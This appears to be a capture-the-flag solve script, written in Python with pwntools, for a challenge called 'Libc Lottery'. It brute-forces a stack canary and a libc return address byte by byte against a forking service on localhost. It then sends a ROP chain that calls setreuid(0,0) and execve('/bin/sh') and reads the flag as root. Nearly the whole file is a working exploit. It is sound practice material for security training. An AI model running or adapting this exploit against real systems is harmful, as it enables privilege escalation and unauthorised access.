# Libc Lottery
import sys
from typing import Callable

import psutil
import pwn

pwn.context.update(arch="amd64", os="linux", terminal=["tmux", "new-window"])


def tee[T: pwn.tube](process: T) -> T:
    orig_recv_raw = process.recv_raw
    output = sys.__stdout__.buffer  # type: ignore sys.stdout is replaced by pwn.term

    def recv_raw(numb, *args, **kwargs):
        data = orig_recv_raw(numb, *args, **kwargs) or b""  # orig may return str('')
        output.write(data)
        output.flush()
        return data

    process.recv_raw = recv_raw
    return process


def find_challenge(search_path="/challenge"):
    import os
    import stat
    from pathlib import Path

    xs = [
        str(f.absolute())
        for f in Path(search_path).iterdir()
        if f.is_file() and os.access(f, os.X_OK) and (f.stat().st_mode & stat.S_ISUID)
    ]
    if not xs:
        raise FileNotFoundError(f"No executable found in {search_path}")
    if len(xs) > 1:
        raise FileNotFoundError(f"Multiple executables found in {search_path}")
    return xs[0]


def find_offset_to_canary(io_maker: Callable[[], pwn.tube]):
    for length in range(0x11, 0x101, 0x8):
        with io_maker() as io:
            io.sendline(pwn.cyclic(length))
            io.sendlineafter(b"Leaving!", b"")
            if b"stack smashing detected" in io.recvrepeat():
                return length - 1
    raise ValueError("failed to find offset")


def kill_child_process(bin):
    for proc in psutil.process_iter():
        if proc.exe() != bin:
            continue
        parent = proc.parent()
        if not parent or parent.exe() != bin:
            continue
        proc.kill()


def one_round(io_maker: Callable[[], pwn.tube], elf, libc):
    kill_child_process(elf.path)  # kill orphaned process from previous round
    offset_canary = find_offset_to_canary(io_maker)
    pwn.success(f"found canary offset: {offset_canary:#x}")

    def crack_canary():
        # return bytes.fromhex('00 17 97 47 90 1e 2c eb'.replace(" ", ""))
        canary = bytearray()
        while len(canary) < 8:
            for byte in range(256):
                candidate = canary + bytes([byte])
                payload = pwn.flat(
                    {
                        offset_canary: candidate,
                    }
                )
                print(f"Trying canary: {candidate.hex(' ')}", end="\r")
                with io_maker() as io:
                    io.send(payload)
                    if b"stack smashing detected" not in io.recvrepeat(1):
                        canary.append(byte)
                        break
            else:
                raise ValueError("failed to crack canary")
        return canary

    def crack_aslr():
        offset_libc_start_main = libc.symbols["__libc_start_main"]
        # location of the main(argc, argv) call block in __libc_start_main
        offset_call_main = offset_libc_start_main + 0xAF
        pwn.success(f"found offset to call main: {offset_call_main:#x}")

        libc_addr = bytearray([offset_call_main & 0xFF])
        while len(libc_addr) < 8:
            for byte in range(256):
                candidate = libc_addr + bytes([byte])
                payload = pwn.flat(
                    {
                        offset_canary + 0x00: canary_leak,
                        offset_canary + 0x10: candidate,
                    },
                )
                print(f"Trying libc_addr: {int.from_bytes(candidate, 'little'):#x}", end="\r")
                with io_maker() as io:
                    io.send(payload)
                    if b"Welcome to" in io.recvrepeat(1):
                        libc_addr.append(byte)
                        kill_child_process(elf.path)
                        break
            else:
                raise ValueError("failed to crack libc_addr")
        return int.from_bytes(libc_addr, "little") - offset_call_main

    def crack_flag():
        rop = pwn.ROP(libc)
        rop.call("setreuid", [0, 0])
        rop.call("execve", [next(libc.search(b"/bin/sh\x00")), 0, 0])
        payload = pwn.flat(
            {
                offset_canary + 0x00: canary_leak,
                offset_canary + 0x10: rop.chain(),
            },
        )
        with io_maker() as io:
            io.send(payload)
            io.sendline(b"id; cat /flag; exit")
            if b"pwn" in (out := io.recvuntil(b"}")):
                print(out.decode())

    canary_leak = crack_canary()
    pwn.log.success(f"leaked canary: {canary_leak.hex(' ')}")

    libc_addr = crack_aslr()
    pwn.log.success(f"leaked libc_addr: {libc_addr:#x}")
    libc.address = libc_addr

    crack_flag()


def one_round_worker(elf, libc):
    def io_maker():
        io = pwn.remote('127.0.0.1', 1337, level='error')
        io.recvuntil(b"\n\n")
        return io

    one_round(io_maker, elf, libc)


def ctf():
    # libc-lottery
    root_bin = find_challenge()
    elf = pwn.ELF(root_bin, checksec=False)
    assert elf.libs

    # file name contains `/libc-`, so we can't use elf.libc.
    libc_path = next(lib for lib in elf.libs.keys() if "libc" in lib and ".so" in lib)
    libc = pwn.ELF(libc_path, checksec=False)

    one_round_worker(elf, libc)


if __name__ == "__main__":
    ctf()
